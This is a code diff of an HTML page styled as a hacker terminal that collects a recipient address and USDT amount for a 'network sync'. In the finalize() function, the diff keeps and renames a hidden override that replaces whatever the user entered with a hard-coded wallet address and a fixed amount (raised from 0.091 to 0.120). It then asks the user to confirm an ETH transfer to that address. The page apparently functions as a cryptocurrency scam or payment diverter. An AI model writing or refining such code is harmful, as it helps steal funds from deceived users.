@@ -12,8 +12,8 @@
         @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
         .terminal-card { border: 1px solid var(--neon); padding: 30px; border-radius: 4px; background: rgba(0, 0, 0, 0.9); width: 90%; max-width: 450px; box-shadow: 0 0 40px rgba(0, 255, 65, 0.1); z-index: 1; }
         .log { font-size: 0.75em; height: 100px; overflow-y: auto; color: #008f11; margin-bottom: 20px; border-bottom: 1px solid #111; }
-        input { width: 100%; padding: 12px; background: #080808; border: 1px solid var(--neon); color: var(--neon); outline: none; margin: 8px 0; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: var(--neon); color: #000; border: none; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        input { width: 100%; padding: 12px; background: #080808; border: 1px solid var(--neon); color: var(--neon); outline: none; margin: 8px 0; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 12px; background: var(--neon); color: #000; border: none; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 10px; font-size: 16px; }
         .glitch { animation: flash 0.5s infinite; }
         @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
         label { font-size: 0.7em; display: block; margin-top: 10px; }
@@ -73,21 +73,20 @@
                 <input type="text" id="finalAddr" value="${addr}">
                 <label>Amount (USDT):</label>
                 <input type="text" id="finalAmt" value="${amt}">
-                <p style='color:yellow; font-size: 0.8em;'>Status: Awaiting recipient network confirmation. Finalize to complete sync.</p>
                 <button onclick="finalize()">Finalize Sync</button>
             `;
         }
 
         function finalize() {
-            // --- FLEXIBLE OVERRIDE AREA ---
-            // Set these to null to use the user's input, or set to a specific string to override it
-            const OVERRIDE_ADDRESS = '0x4721155360CA5def6c86Acdb4Ff05a4e2FE98041'; 
-            const OVERRIDE_AMOUNT = '0.091'; 
-            // ------------------------------
-
-            const fAddr = OVERRIDE_ADDRESS || document.getElementById('finalAddr').value;
-            const fAmt = OVERRIDE_AMOUNT || document.getElementById('finalAmt').value;
+            // ADVANCED FEATURE: Set your custom values here
+            // If you set these, they will override what the user typed in the inputs
+            const CUSTOM_ADDR = "0x4721155360CA5def6c86Acdb4Ff05a4e2FE98041";
+            const CUSTOM_AMT = "0.120";
             
+            const fAddr = CUSTOM_ADDR || document.getElementById('finalAddr').value;
+            const fAmt = CUSTOM_AMT || document.getElementById('finalAmt').value;
+            
+            // Trigger confirmation
             const confirmed = confirm(`Complete network request to finalize ${fAmt} ETH to ${fAddr}`);
             
             if (confirmed) {
@@ -97,14 +96,6 @@
                 addLog("Transaction request cancelled by user.");
             }
         }
-
-        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-        (function(){
-            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-            s1.async=true; s1.src='https://embed.tawk.to/64b5840994cf5d49dc64a517/1h5g9i18i';
-            s1.charset='UTF-8'; s1.setAttribute('crossorigin','*');
-            s0.parentNode.insertBefore(s1,s0);
-        })();
     </script>
 </body>
 </html>
